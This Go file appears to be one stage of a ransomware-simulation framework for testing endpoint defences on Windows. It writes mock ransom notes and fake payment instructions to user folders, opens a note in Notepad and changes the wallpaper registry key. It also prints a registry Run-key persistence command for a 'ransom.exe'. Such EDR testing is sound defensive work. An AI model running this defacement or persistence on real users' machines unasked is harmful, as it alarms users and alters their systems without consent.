// stage-T1491.001.go - Stage 5: Defacement - Internal Defacement
// Simulates ransom note deployment and system defacement

//go:build windows
// +build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"golang.org/x/sys/windows/registry"
)

// Standardized exit codes
const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

const ransomNoteFilename = "README_RANSOMWARE.txt"
const ransomNoteHTML = "YOUR_FILES_ENCRYPTED.html"

func main() {
	// Attach to shared log
	if err := AttachLogger("5ed12ef2-5e29-49a2-8f26-269d8e9edcea", "Stage 5: T1491.001"); err != nil {
		fmt.Printf("[ERROR] Failed to attach logger: %v\n", err)
	}

	LogMessage("INFO", "T1491.001", "Starting Stage 5: Defacement - Internal Defacement")

	// Deploy ransom notes and deface system
	if err := deployRansomNotes(); err != nil {
		LogMessage("ERROR", "T1491.001", fmt.Sprintf("Defacement blocked: %v", err))

		stageData := StageLog{
			StageID:       5,
			Technique:     "T1491.001",
			Name:          "Defacement - Internal Defacement",
			StartTime:     time.Now(),
			EndTime:       time.Now(),
			DurationMs:    0,
			Status:        "blocked",
			ExitCode:      StageBlocked,
			BlockedReason: err.Error(),
		}
		AppendToSharedLog(stageData)

		os.Exit(StageBlocked)
	}

	// Stage completed successfully
	LogMessage("SUCCESS", "T1491.001", "Ransom notes deployed - defacement complete")

	stageData := StageLog{
		StageID:    5,
		Technique:  "T1491.001",
		Name:       "Defacement - Internal Defacement",
		StartTime:  time.Now(),
		EndTime:    time.Now(),
		DurationMs: 0,
		Status:     "success",
		ExitCode:   StageSuccess,
	}
	AppendToSharedLog(stageData)

	os.Exit(StageSuccess)
}

func deployRansomNotes() error {
	fmt.Println("[*] Starting ransom note deployment and system defacement...")

	// Create ransom note content
	ransomNote := `
================================================================================
                         YOUR FILES HAVE BEEN ENCRYPTED!
================================================================================

ATTENTION!

All your important files have been encrypted with military-grade encryption.
This is a F0RT1KA security test simulation.

**THIS IS A SECURITY TEST - NO ACTUAL HARM HAS BEEN DONE**

What Happened?
--------------
Your security solution FAILED to prevent a ransomware attack simulation.
Files with the following extensions have been encrypted: .f0rtika

Test Details:
-------------
Test ID: 5ed12ef2-5e29-49a2-8f26-269d8e9edcea
Attack Chain: T1204.002 → T1134.001 → T1083 → T1486 → T1491.001
Result: SYSTEM VULNERABLE

Recommendations:
----------------
1. Review EDR/AV configuration
2. Enable behavioral detection
3. Implement ransomware protection
4. Regular security testing

================================================================================
                      F0RT1KA SECURITY TESTING FRAMEWORK
================================================================================
`

	// HTML version for visual impact
	ransomNoteHTMLContent := `
<!DOCTYPE html>
<html>
<head>
    <title>RANSOMWARE SIMULATION - F0RT1KA TEST</title>
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: rgba(0,0,0,0.8);
            padding: 40px;
            border-radius: 10px;
            max-width: 800px;
            box-shadow: 0 0 50px rgba(255,0,0,0.5);
        }
        h1 {
            color: #ff4444;
            text-align: center;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        .warning {
            background: #ff4444;
            padding: 20px;
            border-radius: 5px;
            margin: 20px 0;
        }
        .test-notice {
            background: #44ff44;
            color: black;
            padding: 20px;
            border-radius: 5px;
            margin: 20px 0;
            font-weight: bold;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚠️ YOUR FILES HAVE BEEN ENCRYPTED ⚠️</h1>
        <div class="test-notice">
            THIS IS A SECURITY TEST - NO ACTUAL HARM HAS BEEN DONE
        </div>
        <div class="warning">
            <h2>ATTENTION!</h2>
            <p>Your security solution FAILED to prevent this ransomware simulation.</p>
            <p>Test ID: 5ed12ef2-5e29-49a2-8f26-269d8e9edcea</p>
        </div>
        <h3>What This Means:</h3>
        <ul>
            <li>EDR/AV did not block the attack chain</li>
            <li>Privilege escalation was successful</li>
            <li>File encryption was not prevented</li>
            <li>System is vulnerable to ransomware</li>
        </ul>
        <p><strong>F0RT1KA Security Testing Framework</strong></p>
    </div>
</body>
</html>
`

	// Deploy ransom notes to multiple locations
	locations := []string{
		"C:\\F0",
		os.Getenv("USERPROFILE") + "\\Desktop",
		os.Getenv("USERPROFILE") + "\\Documents",
		os.Getenv("USERPROFILE"),
		"C:\\Users\\Public\\Desktop",
	}

	deployedCount := 0

	for _, location := range locations {
		// Check if directory exists
		if _, err := os.Stat(location); os.IsNotExist(err) {
			fmt.Printf("[*] Location does not exist: %s\n", location)
			continue
		}

		// Deploy text ransom note
		txtPath := filepath.Join(location, ransomNoteFilename)
		if err := os.WriteFile(txtPath, []byte(ransomNote), 0644); err != nil {
			fmt.Printf("[!] Failed to write ransom note to %s: %v\n", location, err)
		} else {
			fmt.Printf("[+] Deployed ransom note: %s\n", txtPath)
			LogFileDropped(ransomNoteFilename, txtPath, int64(len(ransomNote)), false)
			deployedCount++
		}

		// Deploy HTML ransom note
		htmlPath := filepath.Join(location, ransomNoteHTML)
		if err := os.WriteFile(htmlPath, []byte(ransomNoteHTMLContent), 0644); err != nil {
			fmt.Printf("[!] Failed to write HTML note to %s: %v\n", location, err)
		} else {
			fmt.Printf("[+] Deployed HTML note: %s\n", htmlPath)
			LogFileDropped(ransomNoteHTML, htmlPath, int64(len(ransomNoteHTMLContent)), false)
			deployedCount++
		}
	}

	if deployedCount == 0 {
		return fmt.Errorf("all ransom note deployments blocked by EDR")
	}

	// Attempt to modify desktop wallpaper (common ransomware behavior)
	fmt.Println("[*] Attempting to modify desktop wallpaper...")
	if err := modifyWallpaper(); err != nil {
		fmt.Printf("[!] Wallpaper modification blocked: %v\n", err)
		// Not critical - continue
	}

	// Attempt to open ransom note automatically
	fmt.Println("[*] Attempting to display ransom note...")
	notepadPath := filepath.Join("C:\\F0", ransomNoteFilename)
	cmd := exec.Command("notepad.exe", notepadPath)
	if err := cmd.Start(); err != nil {
		fmt.Printf("[!] Failed to open ransom note: %v\n", err)
		// Not critical - continue
	} else {
		fmt.Println("[+] Ransom note displayed to user")
	}

	// Create ransom payment instructions (simulated)
	fmt.Println("[*] Creating payment instructions...")
	paymentPath := filepath.Join("C:\\F0", "PAYMENT_INSTRUCTIONS.txt")
	paymentInstructions := `
PAYMENT INSTRUCTIONS (SIMULATED - DO NOT PAY)
=============================================
This is a F0RT1KA security test.
No actual payment is required.

In a real ransomware attack, victims would see:
- Bitcoin wallet address
- Payment amount
- Decryption instructions
- Threat of data publication

Your system FAILED to prevent this simulation.
Please review your security controls immediately.
`
	if err := os.WriteFile(paymentPath, []byte(paymentInstructions), 0644); err != nil {
		fmt.Printf("[!] Failed to write payment instructions: %v\n", err)
	}

	// Simulate persistence (add to startup - but commented out for safety)
	fmt.Println("[*] Would add persistence to startup (simulated only)")
	fmt.Println("[*] Would execute: reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Ransomware /t REG_SZ /d C:\\F0\\ransom.exe")

	fmt.Printf("[+] Stage 5 completed - Deployed %d ransom notes\n", deployedCount)
	fmt.Println("[!] CRITICAL: Ransomware simulation completed full killchain!")

	return nil
}

func modifyWallpaper() error {
	// Create a simple ransomware wallpaper
	wallpaperPath := filepath.Join("C:\\F0", "ransomware_wallpaper.bmp")

	// We'll just create a marker file - actual image creation would be complex
	wallpaperContent := []byte("RANSOMWARE_WALLPAPER_MARKER")
	if err := os.WriteFile(wallpaperPath, wallpaperContent, 0644); err != nil {
		return err
	}

	// Try to set wallpaper via registry (this might be blocked by EDR)
	key, err := registry.OpenKey(registry.CURRENT_USER,
		`Control Panel\Desktop`, registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("registry access blocked: %v", err)
	}
	defer key.Close()

	// Set wallpaper path
	if err := key.SetStringValue("Wallpaper", wallpaperPath); err != nil {
		return fmt.Errorf("registry write blocked: %v", err)
	}

	// Update wallpaper style
	if err := key.SetStringValue("WallpaperStyle", "2"); err != nil {
		return fmt.Errorf("registry write blocked: %v", err)
	}

	fmt.Println("[+] Wallpaper registry modified (requires refresh)")

	// Note: Actual wallpaper change requires SystemParametersInfo API call
	// which we're not doing to avoid actual system modification

	return nil
}